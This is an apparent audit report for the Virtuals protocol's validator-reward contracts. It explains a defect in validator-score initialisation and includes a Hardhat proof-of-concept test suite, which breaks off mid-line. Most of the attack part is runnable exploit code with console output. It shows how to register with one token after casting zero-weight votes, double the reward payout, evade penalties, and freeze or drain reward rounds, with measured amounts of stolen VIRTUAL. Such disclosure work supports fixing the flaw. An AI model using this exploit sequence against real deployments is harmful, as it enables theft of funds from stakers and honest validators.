1. **Unbounded repeated theft (strongest proved case).** The governor counts a vote regardless of its weight, so the pre-registration votes are free and anonymous. An attacker registers with a **single token** of stake via `AgentVeToken.stake`, having pre-voted two proposals with zero voting power, and is then delegated 60 tokens by an ordinary staker (rational, since `validatorRewards` scales with delegated `getVotes` and the attacker displays 200% "uptime"). Measured over two 1,000,000 VIRTUAL rounds: the attacker claimed **545,054.945054945054945052 VIRTUAL** (exactly 2x their 272,527.472527472527472524 VIRTUAL entitlement in the identical negative control) and evaded **536,263.736263736263736264 VIRTUAL** of penalties, while the penalty pool was short by the same amount and an honest never-voting validator's claimable stayed 0. The un-checkpointed base never decays, so the theft repeats on **every** committed round with the attacker doing nothing in between.
2. **Stranded reward rounds (weaker bound).** While the inflated score exceeds `totalProposals`, `participationReward > validatorRewards` and `validatorPoolRewards += validatorRewards - participationReward` underflows, so `distributeRewardsForAgents` reverts with panic 0x11 and the full 1,000,000 VIRTUAL round is stuck (claimable = 0 for all validators and stakers of that agent). The freeze is temporary: once new proposals raise `totalProposals` to the inflated score, the same round unfreezes and pays the attacker double — the DoS is stage one of the theft.

Independently, the missing checkpoint also corrupts history: `getPastValidatorScore` queried at an unchanged past block T1 returned 0 before registration and 3 after `addValidator` at T2 > T1, retroactively inventing participation at T1 where only 1 proposal existed.

### Technical details

**Score initialization (the root defect).** contracts/virtualPersona/ValidatorRegistry.sol:

```solidity
function _initValidatorScore(uint256 virtualId, address validator) internal {
    _baseValidatorScore[validator][virtualId] = _getMaxScore(virtualId);   // line 37 — no subtraction of _getScoreOf(virtualId, validator)
}

function validatorScore(uint256 virtualId, address validator) public view virtual returns (uint256) {
    return _baseValidatorScore[validator][virtualId] + _getScoreOf(virtualId, validator);   // line 41 — double-counts pre-registration votes
}

function getPastValidatorScore(
    uint256 virtualId,
    address validator,
    uint256 timepoint
) public view virtual returns (uint256) {
    return _baseValidatorScore[validator][virtualId] + _getPastScore(virtualId, validator, timepoint);   // line 49 — applies the CURRENT base score to past blocks
}
```

`_getMaxScore(virtualId)` resolves to `totalProposals` (`IAgentDAO(info.dao).proposalCount()`), so a validator registered when `totalProposals = N` who had already voted on `k` proposals gets `validatorScore = N + k` instead of `N`. `AgentNftV2.addValidator` (contracts/virtualPersona/AgentNftV2.sol:133-139) is public and permissionless, and is also invoked by `AgentVeToken.stake` (contracts/virtualPersona/AgentVeToken.sol:76) for the staker's delegatee on every stake — both are ordinary user entry points.

**Consumption in rewards.** contracts/AgentRewardV2.sol, `_distributeValidatorRewards` (lines 223-250):

```solidity
uint256 votes = IERC5805(stakingAddress).getVotes(validator);          // line 239 — DELEGATED votes, not own stake
uint256 validatorRewards = (amount * votes) / totalStaked;             // line 240

uint256 participationReward = totalProposals == 0
    ? 0
    : (validatorRewards * nft.validatorScore(virtualId, validator)) / totalProposals;   // lines 243-245
_validatorRewards[validator][rewardId] = participationReward;

validatorPoolRewards += validatorRewards - participationReward;        // line 248 — underflows when validatorScore > totalProposals
```

- With `validatorScore > totalProposals` (pre-registration votes, few proposals), `participationReward ≥ 2 * validatorRewards` and line 248 reverts with panic 0x11 inside `distributeRewardsForAgents`, freezing the round for every participant (proved; negative control without the pre-registration vote pays out normally).
- With `validatorScore == totalProposals` but half of it fabricated (the base score counts proposals the account already voted on as a validator it was not), the validator is paid a **100% participation rate** instead of the fair 50%, pays **zero** missed-vote penalty into `validatorPoolRewards`, and keeps doing so on every subsequent round because `_baseValidatorScore` never decays and is never re-derived (proved across two committed rounds).

**Why the preconditions are nearly free.** `AgentDAO._castVote` (contracts/virtualPersona/AgentDAO.sol:131-137) bumps the voter's `_scores` checkpoint by 1 purely on the `hasVoted` flip — it does not check voting weight — and `GovernorCountingSimpleUpgradeable` records the vote for any caller. The PoC demonstrates `dao.scoreOf(attacker) == 2` after two `castVote` calls made with zero voting power, no stake and no delegation. Line 240 then multiplies the resulting 200% participation rate by **delegated** voting power, so third-party stake, not attacker capital, scales the payout.

### Assumptions and preconditions

All reachable through the protocol's own public entry points, in the order a real user would call them (no fabricated state):

1. An agent persona exists with an `AgentDAO` that has at least one proposal (`totalProposals ≥ 1`) — proposals are created by the standard `propose` path.
2. The attacker casts `castVote` on existing proposals **before** registration. This requires zero voting power, zero stake, no delegation and no role (weightless votes still bump `scoreOf`), and is permissionless.
3. The attacker registers as a validator by staking **1 token** through `AgentVeToken.stake` (which calls `AgentNftV2.addValidator` → `_initValidatorScore`), or directly via the public `AgentNftV2.addValidator`.
4. For maximal amplification, at least one honest staker delegates to the attacker — rational behavior, since stakers receive 50% of their delegatee's group reward and the attacker's displayed `validatorScore` (e.g. 4 of 2 cast votes) marks them as the highest-"uptime" validator.
5. Governance funds reward rounds via `AgentRewardV2.distributeRewards` (GOV_ROLE) and commits them with `distributeRewardsForAgents` — both standard keeper/protocol operations.

No pre-condition needs any privileged call by the attacker.

### Proof of concept

Run on the audited tree, unmodified sources:

```
npx hardhat test test/PoC_2025_04_virtuals__H_05_f11.js
```

Result: **9 passing, 0 failing**. The suite baseline (2 passing / 59 pre-existing failures in unrelated files, all `invalid BigNumberish value`) is unaffected. Measured console output:

```
  [control] validatorB claimed: 241584158415841584158415 wei; stakerA claimable: 237623762376237623762375 wei
  [attack]   attacker claimed 640000e18 over 2 rounds (fair: 320000e18); penalty pool 960000e18
  [control]  attacker claimed 320000e18 over 2 rounds; penalty pool 1280000e18 (theft = 320000e18 + pool short 320000e18)
  [attack]   previously-frozen round paid attacker 320000e18 (fair 160000e18) once unfrozen
  [control]  attacker claimable 160000e18 (50%); penalty pool 640000e18
  [attack]   pool after 2 rounds: 527472527472527472527472 wei (attacker penalty evaded: 536263736263736263736264 wei); attacker claimed: 545054945054945054945052 wei on 1 token staked
  [control]  pool after 2 rounds: 1063736263736263736263736 wei; attacker claimed: 272527472527472527472524 wei
```

What each test proves (A/B are the base case; C/D/E escalate it; every attack has an in-file negative control identical except for the trigger):

- **A** — historical corruption: `getPastValidatorScore(1, validatorB, T1)` returns 0 before registration and **3** after `addValidator` at T2 > T1, at the unchanged past block T1 where `totalProposals(T1) == 1`.
- **B** — DoS: one pre-registration vote makes `validatorScore == 2` at `totalProposals == 1`; `distributeRewardsForAgents` reverts with **panic 0x11**; the full **1,000,000e18** round sits in the reward contract; `getTotalClaimableRewards == 0` for validatorB, stakerA and stakerK. **B-control**: same flow without the pre-registration vote distributes and pays (validatorB claims 241,584.16e18 wei).
- **C** — persistent theft, capital variant (40-token attacker, no delegation): score 4 at `totalProposals` 4 pays 100% participation on both committed rounds; attacker claims **640,000e18** vs **320,000e18** in the control; penalty pool **960,000e18** vs **1,280,000e18**.
- **D** — the frozen round from B unfreezes once one more proposal lands (`totalProposals` 2 == score 2) and pays the attacker **320,000e18** where the control pays **160,000e18** — the "stuck round" is deferred theft, not a permanent loss of funds.
- **E** — strongest case (1-token attacker + 60-token third-party delegation): attacker claims **545,054.945054945054945052e18 wei** over two 1M rounds on a 1-token stake (control: **272,527.472527472527472524e18 wei**); penalties evaded **536,263.736263736263736264e18 wei**; penalty pool after two rounds **527,472.527472527472527472e18 wei** (only the honest validator's penalties) vs **1,063,736.263736263736263736e18 wei** in the control; the honest never-voting validator's claimable is **0**.

Complete test file (`test/PoC_2025_04_virtuals__H_05_f11.js`):

```javascript
/*
 * PoC for finding 11 (case 2025-04-virtuals__H-05, f11):
 * Uncheckpointed `_baseValidatorScore` in ValidatorRegistry =>
 *   (A) getPastValidatorScore(virtualId, validator, T1) retroactively inflates
 *       when the validator is registered at T2 > T1 (base score set at T2 is
 *       applied to queries about T1);
 *   (B) a validator that voted in the DAO BEFORE registration gets
 *       validatorScore = base(totalProposals at T2) + own DAO score > totalProposals,
 *       which makes AgentRewardV2._distributeValidatorRewards compute
 *       participationReward > validatorRewards and underflow at
 *       `validatorPoolRewards += validatorRewards - participationReward`
 *       => distributeRewardsForAgents reverts (panic 0x11), reward round is
 *       stuck, stakers/validators of that virtual cannot claim.
 *
 * Everything is deployed locally (fork-free) and reached only through public
 * entry points (mint via MINTER_ROLE admin path used by the factory, stake,
 * delegate, propose, castVote, distributeRewards, distributeRewardsForAgents,
 * claimAllRewards).
 */
const { expect } = require("chai");
const { ethers, upgrades } = require("hardhat");
const { parseEther } = require("ethers");
const {
  loadFixture,
  mine,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");

const REWARD_SIZE = parseEther("1000000");

async function getSigners() {
  const [deployer, founder, stakerA, stakerK, staker2, validatorB, attacker] =
    await ethers.getSigners();
  return { deployer, founder, stakerA, stakerK, staker2, validatorB, attacker };
}

async function deploySystem() {
  const { deployer, founder } = await getSigners();

  const virtualToken = await ethers.deployContract("VirtualToken", [
    parseEther("100000000"),
    deployer.address,
  ]);
  await virtualToken.waitForDeployment();

  const agentNft = await upgrades.deployProxy(
    await ethers.getContractFactory("AgentNftV2"),
    [deployer.address]
  );
  const contribution = await upgrades.deployProxy(
    await ethers.getContractFactory("ContributionNft"),
    [agentNft.target]
  );
  const service = await upgrades.deployProxy(
    await ethers.getContractFactory("ServiceNft"),
    [agentNft.target, contribution.target, 1000]
  );
  await agentNft.setContributionService(contribution.target, service.target);

  const veToken = await upgrades.deployProxy(
    await ethers.getContractFactory("AgentVeToken"),
    [
      "Staked Agent",
      "sAG",
      founder.address,
      virtualToken.target,
      0,
      agentNft.target,
      false,
    ],
    { unsafeAllow: ["constructor"] }
  );

  const dao = await upgrades.deployProxy(
    await ethers.getContractFactory("AgentDAO"),
    ["Agent DAO", veToken.target, agentNft.target, 0, 100],
    { unsafeAllow: ["constructor"] }
  );

  const rewards = await upgrades.deployProxy(
    await ethers.getContractFactory("AgentRewardV2"),
    [
      virtualToken.target,
      agentNft.target,
      contribution.target,
      service.target,
      {
        protocolShares: 0,
        contributorShares: 2000,
        stakerShares: 5000,
        parentShares: 0,
        stakeThreshold: 1,
      },
    ]
  );
  await rewards.waitForDeployment();
  await rewards.grantRole(await rewards.GOV_ROLE(), deployer.address);

  // Persona creation: same mint() call the factory performs (MINTER_ROLE)
  await agentNft.grantRole(await agentNft.MINTER_ROLE(), deployer.address);
  await agentNft.mint(
    1,
    founder.address,
    "http://agent",
    dao.target,
    founder.address,
    [0, 1, 2],
    virtualToken.target,
    veToken.target
  );
  await agentNft.setTBA(1, founder.address);

  // Open staking (veToken founder)
  await veToken.connect(founder).setCanStake(true);

  return { virtualToken, agentNft, veToken, dao, rewards };
}

async function stake(virtualToken, veToken, who, amount, receiver, delegatee) {
  await virtualToken.mint(who.address, amount);
  await virtualToken.connect(who).approve(veToken.target, amount);
  await veToken.connect(who).stake(amount, receiver.address, delegatee.address);
}

async function propose(dao, founder, description) {
  const tx = await dao.propose([founder.address], [0], ["0x"], description);
  const rc = await tx.wait();
  for (const log of rc.logs) {
    const parsed = dao.interface.parseLog(log);
    if (parsed && parsed.name === "ProposalCreated") {
      return parsed.args.proposalId;
    }
  }
  throw new Error("ProposalCreated event not found");
}

describe("PoC 2025-04-virtuals H-05 f11: uncheckpointed _baseValidatorScore", function () {
  async function setup() {
    const sys = await deploySystem();
    const signers = await getSigners();
    return { ...sys, ...signers };
  }

  it("A: historical score for block T1 is 0 before registration and retroactively inflates after addValidator at T2", async function () {
    const { agentNft, dao, virtualToken, veToken, founder, stakerA, validatorB } =
      await loadFixture(setup);

    // stakerA becomes a validator at genesis time (totalProposals == 0) -- the
    // benign ordering used as the negative control for this part.
    await stake(virtualToken, veToken, stakerA, parseEther("60"), stakerA, stakerA);

    // T1: one proposal exists
    await propose(dao, founder, "p1");
    const t1 = await ethers.provider.getBlockNumber();
    const totalProposalsAtT1 = await agentNft.totalProposals(1);
    expect(totalProposalsAtT1).to.equal(1n);
    await mine(1); // past lookups need timepoint < current block

    // Before registration: B is not a validator, has no DAO score
    expect(await agentNft.isValidator(1, validatorB.address)).to.equal(false);
    const before = await agentNft.getPastValidatorScore(1, validatorB.address, t1);
    expect(before).to.equal(0n);

    // T2: two more proposals => totalProposals = 3, then B is registered via the
    // permissionless public entry point (AgentNftV2.addValidator)
    await propose(dao, founder, "p2");
    await propose(dao, founder, "p3");
    expect(await agentNft.totalProposals(1)).to.equal(3n);
    await agentNft.addValidator(1, validatorB.address);
    expect(await agentNft.isValidator(1, validatorB.address)).to.equal(true);

    // Same (virtualId, validator, timepoint) query at unchanged T1:
    const after = await agentNft.getPastValidatorScore(1, validatorB.address, t1);
    expect(after).to.equal(3n);
    // Inflated from 0 to 3 (+3) at an unchanged past timepoint
    expect(after - before).to.equal(3n);
    expect(after > totalProposalsAtT1).to.equal(true);

    // Negative control: genesis-registered validator (base score 0) -- the same
    // sequence leaves the historical query stable and truthful
    const ctrlBeforeChanges = await agentNft.getPastValidatorScore(1, stakerA.address, t1);
    expect(ctrlBeforeChanges).to.equal(0n); // stakerA never voted
  });

  it("B: pre-registration vote => validatorScore > totalProposals => distributeRewardsForAgents reverts with panic 0x11 and the reward round is stuck", async function () {
    const {
      virtualToken,
      agentNft,
      veToken,
      dao,
      rewards,
      deployer,
      founder,
      stakerA,
      stakerK,
      staker2,
      validatorB,
    } = await loadFixture(setup);

    // 1. Two stakers self-delegate (both become validators with base score 0,
    //    totalProposals is still 0 at this point)
    await stake(virtualToken, veToken, stakerA, parseEther("60"), stakerA, stakerA);
    await stake(virtualToken, veToken, stakerK, parseEther("40"), stakerK, stakerK);

    // 2. stakerA delegates voting power to validatorB (B is NOT a validator yet)
    await veToken.connect(stakerA).delegate(validatorB.address);

    // 3. One proposal (totalProposals = 1)
    const proposalId = await propose(dao, founder, "p1");
    expect(await agentNft.totalProposals(1)).to.equal(1n);

    // 4. B votes BEFORE being registered as validator
    await dao.connect(validatorB).castVote(proposalId, 1);
    expect(await agentNft.validatorScore(1, validatorB.address)).to.equal(1n);

    // 5. B becomes a validator through the production staking path
    //    (AgentVeToken.stake -> AgentNftV2.addValidator -> _initValidatorScore)
    await stake(virtualToken, veToken, staker2, parseEther("1"), staker2, validatorB);
    expect(await agentNft.isValidator(1, validatorB.address)).to.equal(true);

    // The defect: base score (1) does not subtract the DAO score B already had (1)
    const scoreB = await agentNft.validatorScore(1, validatorB.address);
    const totalProposals = await agentNft.totalProposals(1);
    expect(scoreB).to.equal(2n);
    expect(totalProposals).to.equal(1n);
    expect(scoreB > totalProposals).to.equal(true); // 200% participation

    // 6. Gov funds a reward round
    await virtualToken.mint(deployer.address, REWARD_SIZE);
    await virtualToken.approve(rewards.target, REWARD_SIZE);
    await rewards.distributeRewards(REWARD_SIZE);
    await mine(1);

    // 7. Distribution to virtual 1 underflows:
    //    participationReward = validatorRewards * 2 / 1 = 2 * validatorRewards
    //    validatorPoolRewards += validatorRewards - 2*validatorRewards -> panic 0x11
    await expect(rewards.distributeRewardsForAgents(0, [1])).to.be.revertedWithPanic(
      "0x11"
    );

    // 8. Measured adverse state: the full round is stuck in the reward contract,
    //    nobody can claim anything
    expect(await virtualToken.balanceOf(rewards.target)).to.equal(REWARD_SIZE);
    expect(
      await rewards.getTotalClaimableRewards(validatorB.address, [1], [])
    ).to.equal(0n);
    expect(await rewards.getTotalClaimableRewards(stakerA.address, [1], [])).to.equal(0n);
    expect(await rewards.getTotalClaimableRewards(stakerK.address, [1], [])).to.equal(0n);
  });

  it("B-negative-control: identical flow without the pre-registration vote distributes and pays out normally", async function () {
    const {
      virtualToken,
      agentNft,
      veToken,
      dao,
      rewards,
      deployer,
      founder,
      stakerA,
      stakerK,
      staker2,
      validatorB,
    } = await loadFixture(setup);

    // Identical to test B, except step 4 (B's pre-registration vote) is skipped.
    await stake(virtualToken, veToken, stakerA, parseEther("60"), stakerA, stakerA);
    await stake(virtualToken, veToken, stakerK, parseEther("40"), stakerK, stakerK);
    await veToken.connect(stakerA).delegate(validatorB.address);
    await propose(dao, founder, "p1");
    expect(await agentNft.totalProposals(1)).to.equal(1n);

    await stake(virtualToken, veToken, staker2, parseEther("1"), staker2, validatorB);
    expect(await agentNft.isValidator(1, validatorB.address)).to.equal(true);

    // Without the pre-registration vote the score stays within bounds
    const scoreB = await agentNft.validatorScore(1, validatorB.address);
    expect(scoreB).to.equal(1n); // == totalProposals, not 2x

    await virtualToken.mint(deployer.address, REWARD_SIZE);
    await virtualToken.approve(rewards.target, REWARD_SIZE);
    await rewards.distributeRewards(REWARD_SIZE);
    await mine(1);

    // Same gov call as in test B: succeeds, no panic
    await expect(rewards.distributeRewardsForAgents(0, [1])).to.not.be.reverted;

    // Validators and stakers can claim and are actually paid
    const claimableB = await rewards.getTotalClaimableRewards(validatorB.address, [1], []);
    const claimableA = await rewards.getTotalClaimableRewards(stakerA.address, [1], []);
    expect(claimableB).to.be.gt(0n);
    expect(claimableA).to.be.gt(0n);

    const balanceBBefore = await virtualToken.balanceOf(validatorB.address);
    await rewards.connect(validatorB).claimAllRewards([1], []);
    const balanceBAfter = await virtualToken.balanceOf(validatorB.address);
    expect(balanceBAfter - balanceBBefore).to.equal(claimableB);
    console.log(
      "  [control] validatorB claimed:",
      claimableB.toString(),
      "wei; stakerA claimable:",
      claimableA.toString(),
      "wei"
    );
  });
});

/*
 * ESCALATION (same root defect: _initValidatorScore sets
 * _baseValidatorScore = totalProposals at registration WITHOUT subtracting
 * the DAO score the account already accumulated, and never checkpoints it).
 *
 * The base PoC stops at the transient state (score > totalProposals =>
 * underflow => round frozen). But the freeze is recoverable: every new DAO
 * proposal raises totalProposals, and once totalProposals >= score the very
 * same frozen round distributes -- paying the inflated validator
 * score/totalProposals = 100% instead of the fair 50%. The base never
 * decays, so the overpayment repeats on EVERY subsequently committed reward
 * round, draining the validator penalty pool (validatorPoolRewards, funded
 * by honest validators' missed-vote penalties, gov-withdrawable).
 *
 * Weaker preconditions than the base PoC: GovernorCountingSimpleUpgradeable
 * marks hasVoted regardless of vote weight and AgentDAO._castVote bumps
 * _scores on that flip, so the pre-registration "votes" require ZERO voting
 * power -- any anonymous address casts them for free (no stake, no
 * delegation, no role), then registers as a validator with one ordinary
 * stake through the production path (AgentVeToken.stake ->
 * AgentNftV2.addValidator -> _initValidatorScore).
 *
 * Arithmetic (per 1M VIRTUAL round, stakerShares 5000, contributorShares
 * 2000, only virtual 1 => validatorAmount = 800k):
 *   stakerA stakes 60 (genesis validator, never votes) -> vr = 480k -> pool
 *   attacker stakes 40 and self-delegates              -> vr = 320k
 *   attack:   score 4 at tp 4 -> participation 320k (100%)
 *   control:  score 2 at tp 4 -> participation 160k ( 50%)
 *   => 160k per round stolen from the penalty pool, 320k over two rounds.
 */
describe("PoC 2025-04-virtuals H-05 f11 ESCALATION: persistent theft of validator rewards", function () {
  async function setup() {
    const sys = await deploySystem();
    const signers = await getSigners();
    return { ...sys, ...signers };
  }

  // Two committed reward rounds; attacker claims 200% of entitlement in both.
  it("C: pre-registration zero-weight votes => 100% participation forever => repeated theft from the validator penalty pool across committed rounds", async function () {
    const { virtualToken, agentNft, veToken, dao, rewards, deployer, founder, stakerA, attacker } =
      await loadFixture(setup);

    const V = (n) => parseEther(n);
    const ATTACKER_VR = V("320000"); // 800k * 40/100
    const STAKERA_VR = V("480000"); // 800k * 60/100

    // 1. Honest staker stakes 60 at genesis (validator with base score 0)
    await stake(virtualToken, veToken, stakerA, parseEther("60"), stakerA, stakerA);

    // 2. Two proposals exist (totalProposals = 2)
    const p1 = await propose(dao, founder, "p1");
    const p2 = await propose(dao, founder, "p2");
    expect(await agentNft.totalProposals(1)).to.equal(2n);

    // 3. THE TRIGGER, weakest form: attacker votes on BOTH proposals with
    //    ZERO voting power (no stake, no delegation, no role -- just free
    //    permissionless castVote calls). hasVoted flips, DAO score = 2.
    await dao.connect(attacker).castVote(p1, 1);
    await dao.connect(attacker).castVote(p2, 1);
    expect(await dao.scoreOf(attacker.address)).to.equal(2n);

    // 4. Attacker registers via the production staking path with a plain
    //    40-token stake, self-delegated. _initValidatorScore sets base = 2
    //    (totalProposals) without subtracting the DAO score of 2.
    await stake(virtualToken, veToken, attacker, parseEther("40"), attacker, attacker);
    expect(await agentNft.isValidator(1, attacker.address)).to.equal(true);
    expect(await agentNft.validatorScore(1, attacker.address)).to.equal(4n); // 2 + 2

    // 5. Two more proposals => totalProposals = 4 == score: no underflow,
    //    distribution succeeds and pays the attacker 100% participation.
    await propose(dao, founder, "p3");
    await propose(dao, founder, "p4");
    expect(await agentNft.totalProposals(1)).to.equal(4n);

    // 6. Round 1 committed
    await virtualToken.mint(deployer.address, REWARD_SIZE);
    await virtualToken.approve(rewards.target, REWARD_SIZE);
    await rewards.distributeRewards(REWARD_SIZE);
    await mine(1);
    await expect(rewards.distributeRewardsForAgents(0, [1])).to.not.be.reverted;
    // Penalty pool: only stakerA's honest penalties (480k); attacker paid in
    // full, contributed nothing.
    expect(await rewards.validatorPoolRewards()).to.equal(STAKERA_VR);

    // 7. Round 2 committed -- attacker does NOTHING in between; the
    //    uncheckpointed base score keeps paying.
    await virtualToken.mint(deployer.address, REWARD_SIZE);
    await virtualToken.approve(rewards.target, REWARD_SIZE);
    await rewards.distributeRewards(REWARD_SIZE);
    await mine(1);
    await expect(rewards.distributeRewardsForAgents(1, [1])).to.not.be.reverted;
    expect(await rewards.validatorPoolRewards()).to.equal(STAKERA_VR * 2n);

    // 8. R1: measured adverse state change -- attacker extracts 640k of the
    //    2M committed (2x the 320k entitlement of a 40/100 staker)
    const claimable = await rewards.getTotalClaimableRewards(attacker.address, [1], []);
    expect(claimable).to.equal(ATTACKER_VR * 2n); // 100% of vr, twice
    const balBefore = await virtualToken.balanceOf(attacker.address);
    await rewards.connect(attacker).claimAllRewards([1], []);
    const balAfter = await virtualToken.balanceOf(attacker.address);
    expect(balAfter - balBefore).to.equal(ATTACKER_VR * 2n);

    console.log(
      "  [attack]   attacker claimed 640000e18 over 2 rounds (fair: 320000e18); penalty pool 960000e18"
    );
  });

  // R3 negative control: identical sequence, benign ordering -- the attacker
  // registers BEFORE casting any vote (the defect's trigger is absent).
  it("C-negative-control: identical flow with registration before any vote pays 50% and funds the penalty pool", async function () {
    const { virtualToken, agentNft, veToken, dao, rewards, deployer, founder, stakerA, attacker } =
      await loadFixture(setup);

    const V = (n) => parseEther(n);
    const ATTACKER_VR = V("320000");
    const STAKERA_VR = V("480000");

    await stake(virtualToken, veToken, stakerA, parseEther("60"), stakerA, stakerA);
    await propose(dao, founder, "p1");
    await propose(dao, founder, "p2");
    expect(await agentNft.totalProposals(1)).to.equal(2n);

    // No pre-registration votes: register first (base score 2, DAO score 0)
    await stake(virtualToken, veToken, attacker, parseEther("40"), attacker, attacker);
    expect(await agentNft.validatorScore(1, attacker.address)).to.equal(2n);

    await propose(dao, founder, "p3");
    await propose(dao, founder, "p4");
    expect(await agentNft.totalProposals(1)).to.equal(4n);

    await virtualToken.mint(deployer.address, REWARD_SIZE);
    await virtualToken.approve(rewards.target, REWARD_SIZE);
    await rewards.distributeRewards(REWARD_SIZE);
    await mine(1);
    await expect(rewards.distributeRewardsForAgents(0, [1])).to.not.be.reverted;
    expect(await rewards.validatorPoolRewards()).to.equal(STAKERA_VR + V("160000"));

    await virtualToken.mint(deployer.address, REWARD_SIZE);
    await virtualToken.approve(rewards.target, REWARD_SIZE);
    await rewards.distributeRewards(REWARD_SIZE);
    await mine(1);
    await expect(rewards.distributeRewardsForAgents(1, [1])).to.not.be.reverted;
    // Pool accrues the attacker's fair 160k penalty each round
    expect(await rewards.validatorPoolRewards()).to.equal((STAKERA_VR + V("160000")) * 2n);

    // Attacker gets exactly half of what the attack extracted
    const claimable = await rewards.getTotalClaimableRewards(attacker.address, [1], []);
    expect(claimable).to.equal(V("160000") * 2n); // 50% of vr, twice
    const balBefore = await virtualToken.balanceOf(attacker.address);
    await rewards.connect(attacker).claimAllRewards([1], []);
    const balAfter = await virtualToken.balanceOf(attacker.address);
    expect(balAfter - balBefore).to.equal(V("160000") * 2n);

    console.log(
      "  [control]  attacker claimed 320000e18 over 2 rounds; penalty pool 1280000e18 (theft = 320000e18 + pool short 320000e18)"
    );
  });

  // The base PoC's "stuck round" is stage one of the same theft: once
  // totalProposals catches up with the inflated score, the SAME frozen round
  // unfreezes and pays the attacker double.
  it("D: the frozen round from the base PoC unfreezes into theft once totalProposals catches up", async function () {
    const { virtualToken, agentNft, veToken, dao, rewards, deployer, founder, stakerA, attacker } =
      await loadFixture(setup);

    const V = (n) => parseEther(n);
    const ATTACKER_VR = V("320000");
    const STAKERA_VR = V("480000");

    await stake(virtualToken, veToken, stakerA, parseEther("60"), stakerA, stakerA);

    // One proposal; attacker pre-votes it (zero weight), then registers
    // => score = 2 at totalProposals = 1 (the base PoC B condition)
    const p1 = await propose(dao, founder, "p1");
    expect(await agentNft.totalProposals(1)).to.equal(1n);
    await dao.connect(attacker).castVote(p1, 1);
    expect(await dao.scoreOf(attacker.address)).to.equal(1n);

    await stake(virtualToken, veToken, attacker, parseEther("40"), attacker, attacker);
    expect(await agentNft.validatorScore(1, attacker.address)).to.equal(2n);

    // Round funded and frozen exactly as in base PoC B (panic 0x11)
    await virtualToken.mint(deployer.address, REWARD_SIZE);
    await virtualToken.approve(rewards.target, REWARD_SIZE);
    await rewards.distributeRewards(REWARD_SIZE);
    await mine(1);
    await expect(rewards.distributeRewardsForAgents(0, [1])).to.be.revertedWithPanic("0x11");
    expect(await virtualToken.balanceOf(rewards.target)).to.equal(REWARD_SIZE);
    expect(await rewards.getTotalClaimableRewards(attacker.address, [1], [])).to.equal(0n);

    // One more proposal => totalProposals = 2 == score: the SAME round now
    // distributes and pays the attacker 100% instead of the fair 50%
    await propose(dao, founder, "p2");
    expect(await agentNft.totalProposals(1)).to.equal(2n);
    await expect(rewards.distributeRewardsForAgents(0, [1])).to.not.be.reverted;

    // Attacker took 0 penalty on 320k of vr; pool holds only stakerA's 480k
    expect(await rewards.validatorPoolRewards()).to.equal(STAKERA_VR);

    const claimable = await rewards.getTotalClaimableRewards(attacker.address, [1], []);
    expect(claimable).to.equal(ATTACKER_VR); // 100% of vr
    const balBefore = await virtualToken.balanceOf(attacker.address);
    await rewards.connect(attacker).claimAllRewards([1], []);
    const balAfter = await virtualToken.balanceOf(attacker.address);
    expect(balAfter - balBefore).to.equal(ATTACKER_VR);

    console.log(
      "  [attack]   previously-frozen round paid attacker 320000e18 (fair 160000e18) once unfrozen"
    );
  });

  // R3 negative control for D: same distribution timing, benign ordering
  // (registration before the vote). Matches the fixed-code baseline for the
  // attacker (base = maxScore - currentScore = 0, score = 1 at tp 2 => 50%).
  it("D-negative-control: same flow without the pre-registration vote pays 50% into the round", async function () {
    const { virtualToken, agentNft, veToken, dao, rewards, deployer, founder, stakerA, attacker } =
      await loadFixture(setup);

    const V = (n) => parseEther(n);
    const STAKERA_VR = V("480000");

    await stake(virtualToken, veToken, stakerA, parseEther("60"), stakerA, stakerA);
    await propose(dao, founder, "p1");

    await stake(virtualToken, veToken, attacker, parseEther("40"), attacker, attacker);
    expect(await agentNft.validatorScore(1, attacker.address)).to.equal(1n);

    await propose(dao, founder, "p2");
    expect(await agentNft.totalProposals(1)).to.equal(2n);

    await virtualToken.mint(deployer.address, REWARD_SIZE);
    await virtualToken.approve(rewards.target, REWARD_SIZE);
    await rewards.distributeRewards(REWARD_SIZE);
    await mine(1);
    await expect(rewards.distributeRewardsForAgents(0, [1])).to.not.be.reverted;

    // Pool accrues the attacker's fair 160k penalty on top of stakerA's 480k
    expect(await rewards.validatorPoolRewards()).to.equal(STAKERA_VR + V("160000"));
    expect(
      await rewards.getTotalClaimableRewards(attacker.address, [1], [])
    ).to.equal(V("160000")); // 50% of vr

    console.log("  [control]  attacker claimable 160000e18 (50%); penalty pool 640000e18");
  });
});

/*
 * ESCALATION 2 (same root defect: _initValidatorScore sets
 * _baseValidatorScore = totalProposals at registration without subtracting
 * the DAO score the account already accumulated, and never checkpoints it).
 *
 * The unused lever: in AgentRewardV2._distributeValidatorRewards the
 * validator revenue is vr = amount * getVotes(validator) / totalStaked --
 * it scales with DELEGATED votes, not with the validator's own stake
 * (AgentVeToken.stake/delegate let any staker ride on a delegatee). So the
 * attacker does not need the 40% capital of escalation C:
 *
 *   - 1 (one) token of stake registers the attacker as a validator,
 *   - two zero-weight castVote calls (free, anonymous, permissionless)
 *     before registration double the score (base 2 + daoScore 2 = 4),
 *   - an honest staker rationally re-delegates 60 tokens to the attacker
 *     (stakers receive 50% of the delegatee's group reward, so delegating
 *     to the top-"uptime" validator is the yield-maximizing move),
 *   => the attacker's vr now covers ~2/3 of the virtual's entire
 *   validatorAmount while their true participation is zero, and the
 *   uncheckpointed base keeps paying 100% on EVERY committed round.
 *
 * Measured (per 1M round, validatorAmount = 800k, totalStaked 91):
 *   attack:   attacker participation = vr*4/4 = 536263e18 (100%), pays no
 *             penalty; penalty pool accrues ONLY honest stakerK's 263736e18
 *   control:  attacker participation = vr*2/4 = 268131e18 ( 50%); pool
 *             accrues 268131e18 of the attacker's fair penalty on top
 *   => pool short 268131e18 per round, unbounded across rounds, at the
 *   cost of 1 token of stake and two free votes.
 */
describe("PoC 2025-04-virtuals H-05 f11 ESCALATION 2: capital-free maximal drain via third-party delegation", function () {
  async function setup() {
    const sys = await deploySystem();
    const signers = await getSigners();
    return { ...sys, ...signers };
  }

  const V = (n) => parseEther(n);
  // Mirror of AgentRewardV2 arithmetic for totalStaked = 91 (60 stakerA + 30
  // stakerK + 1 attacker), attacker votes 61 (self 1 + stakerA's 60).
  const validatorAmount = V("800000"); // 1M * (1 - contributorShares 2000/10000)
  const vrAtt = (validatorAmount * 61n) / 91n;
  const vrK = (validatorAmount * 30n) / 91n;
  const partAttAttack = vrAtt; // score 4 at totalProposals 4 => 100%
  const partAttCtrl = (vrAtt * 2n) / 4n; // score 2 at totalProposals 4 => 50%

  const claimableFor = (participation) =>
